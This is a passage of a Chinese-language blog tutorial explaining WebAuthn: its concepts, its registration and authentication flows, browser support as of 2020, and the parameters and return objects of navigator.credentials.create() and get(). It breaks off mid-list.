Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 